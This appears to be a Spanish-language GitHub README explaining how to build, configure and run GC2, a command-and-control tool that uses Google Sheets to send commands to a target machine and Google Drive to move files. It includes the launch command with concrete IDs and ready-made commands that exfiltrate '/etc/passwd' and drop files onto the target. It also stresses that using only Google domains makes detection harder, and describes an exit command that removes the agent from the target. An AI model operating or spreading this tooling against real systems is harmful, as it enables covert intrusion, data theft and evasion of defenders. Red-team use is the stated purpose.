# Instalación de C2 - G2C2

![image](https://user-images.githubusercontent.com/50930193/179373047-c649bdcf-7747-4743-80e4-a34b0b38de48.png)

GC2 (Comando y Control de Google) es una aplicación de Comando y Control que permite a un atacante ejecutar comandos en la máquina de destino usando Google Sheet y extrae datos usando Google Drive.

Este programa ha sido desarrollado para proporcionar un comando y control que no requiere ninguna configuración particular (como: un dominio personalizado, VPS, CDN, ...) durante las actividades de Red Teaming.

Además, el programa interactuará únicamente con los dominios de Google (*.google.com) para dificultar la detección.

# Configuración

## 1. Generar ejecutables
 
    ```
    git clone https://github.com/looCiprian/GC2-sheet
    cd GC2-sheet
    go build gc2-sheet.go
    ```

## 2. Crear una nueva "cuenta de servicio" de Google**

Cree una nueva "cuenta de servicio" de Google usando la consola de Google (https://console.cloud.google.com/), para ello siga los pasos siguientes:

Buscar "CREAR UN PROYECTO" y elegir esta opción 
<br/>
![image](https://user-images.githubusercontent.com/50930193/179372995-3303b02c-5c29-43d1-b020-5f14d1300a45.png)
<br/>
llenar la información solicitada en el proyecto:
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373059-1133b5ee-3181-49b4-8def-41c2ceb201af.png)
<br/>
Una vez creado el proyecto ir a la "Configuración del proyecto"
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373625-29ed9e5d-577f-4be9-95ea-8bb8acce3869.png)
<br/>
Y luego a "Cuentas de servicio" 
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373658-068d7080-ac84-4f54-920f-a8c9fd4a05bd.png)
<br/>
Para luego llenar el formulario par crear la cuenta
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373723-5ddc947c-2a0b-426e-8593-2776695321dd.png)
<br/>
Asignar el rol de propietario
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373736-0619bbbc-172c-4e38-8ee9-29e8c96b7112.png)
<br/>
Seleccionar la nueva cuenta de servicio creada
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373794-308da813-91a7-40f4-8f12-27e5535a6430.png)
<br/>
Crear las llaves para la cuenta de servicio
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373809-38b0e243-1994-4f50-8ced-230ed56864ef.png)
<br/>
Seleccione "Crear clave nueva"
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373835-55562aa7-4e88-4799-82b5-baba0c36215d.png)
<br/>
y luego en el popup elija que el tipo de clave sea JSON y luego elija "CREAR"
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373876-c3188f31-0731-43c7-b393-19658966881e.png)
<br/>
Se deberá haber creado la clave en formato JSON y descargado al disco
<br/>
![image](https://user-images.githubusercontent.com/50930193/179373857-82a03639-cd07-44df-bc13-d29b63562de6.png)
<br/>
Finalmente, mover el JSON descargado a la carpeta donde se encuentra el GC2 Sheet
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374002-99916d33-cd03-4f23-9418-2b3e7d0f57f5.png)


## 3. Habilite la API de Google Sheet y la API de Google Drive
<br/>
Para ello  usando usando la consola de Google (https://console.cloud.google.com/).

Ahora, busque *Google Drive API* y habilite el servicio
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374125-fe53647b-d024-4b69-a61d-78622b9cfd18.png)
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374142-e6951503-997a-4cc4-89dc-98d2480b0857.png)
<br/>
Del mismo modo  busque *Google Sheet API* y habilite el servicio
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374258-ffc62547-888c-4352-9f66-37bbbeaf2b54.png)
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374272-e274d022-5953-4103-b30c-54ae26d2b042.png)
<br/>

## 4. Configurar Google Sheet y Google Drive

Cree una nueva carpeta y una hoja de cálculo de Google Drive y agregue la cuenta de servicio al grupo de editores de la hoja de cáclculo y de la carpeta.
Para agregar la cuenta de servicio use su correo electrónico. Guíese de la imagen.
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374491-b643bfc7-cc5a-49ec-9a6a-943be0100e8e.png)
<br/>
## 5. Iniciar el servidor C2

Para elllo, ejecutar el comando siguiente desde Kali

```
./gc2-sheet --key <GCP service account credential file .JSON > --sheet <Google sheet ID> --drive <Google drive ID> 
```
<br/>
Y en donde los ID corresponden a los valores del URL de la carpeta y hoja de cálculo creados tal como sigue

![image](https://user-images.githubusercontent.com/50930193/179374586-b63cdb18-44fc-4486-97dd-7eb3fa0b23b7.png)
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374595-09da1f81-4144-4f78-855c-f3da1c5414bd.png)

Y el GCP al archivo JSON Descargado
<br/>
![image](https://user-images.githubusercontent.com/50930193/179374661-4a68fcbe-155f-4225-8a61-a1475ec5bdf2.png)
<br/>

Finalmente el comando a ejecutar es el siguiente:

```
./gc2-sheet --key c2oseh-58099cb62f54.json --sheet 1uAxAYyQbBtaKUGCvnx_Xcfc9gRA8CFCQgnLxsNT8fcM --drive 1QQ8bLq2sSg6HwS9hM2R5JJgGzSqj2smj 
```
## Características y Flujo

1. Ejecución de comandos utilizando Google Sheet como consola
2. Descargar archivos en el objetivo usando Google Drive
3. Exfiltración de datos usando Google Drive
4. Salida

![image](https://user-images.githubusercontent.com/50930193/179385717-a55ba33a-f54e-4b40-b5d0-4f52af3d5343.png)


# Interacción con los agentes
Desde la hoja excel, cada ejecución del comando anterior generará una pestaña de hoja excel, similar al siguiente:
<br/>
![image](https://user-images.githubusercontent.com/50930193/179384549-408f6e12-8a0e-4c5a-9ebe-94dcbe0bf7f1.png)
<br/>
Ya en cada hoja lo que se puede hacer es digitar los comandos, el programa realizará una solicitud a la hoja de cálculo cada 5 segundos para verificar si hay algunos comandos nuevos. Los comandos deben insertarse en la columna "A", y la salida se imprimirá en la columna "B".

![image](https://user-images.githubusercontent.com/50930193/179384679-f79a0303-8c82-4ded-bf7f-5468863450b1.png)


#  Archivo de exfiltración de datos
Se reservan comandos especiales para realizar la carga y descarga en la máquina de destino
```
From Target to Google Drive
upload;<remote path>
Example:
upload;/etc/passwd
 ```
 ![image](https://user-images.githubusercontent.com/50930193/179385406-08583577-a28a-41de-a441-6c0de58ef5e5.png)

# Descargar archivo
Se reservan comandos especiales para realizar la carga y descarga en la máquina de destino
```
From Google Drive to Target
download;<google drive file id>;<remote path>
Example:
download;<file ID>;/home/user/downloaded.txt
download;1bXLiPyMRhkebVoMDsyq7Ttf8UA5Ntzl0;/opt/GC2-sheet/ssrf.py
```
![image](https://user-images.githubusercontent.com/50930193/179385635-2584009d-dead-4481-b7b0-4502cf9a64e8.png)

# Salida
Al enviar el comando exit , el programa se eliminará del objetivo y eliminará su proceso.
